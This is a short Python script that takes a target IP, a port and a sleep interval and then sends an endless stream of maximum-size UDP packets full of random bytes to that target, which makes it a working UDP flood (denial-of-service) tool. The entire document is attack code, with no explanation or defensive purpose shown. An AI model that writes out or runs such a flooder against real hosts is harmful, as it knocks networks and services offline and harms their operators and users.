import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Target ip:")
port = int(input("target port:"))
sleep = float(input("sleep:"))

i = 1 
while True:
    s.sendto(random._urandom(65507),(ip,port))
    print(f"send:{i}", end='\r')
    i += 1
    time.sleep(sleep)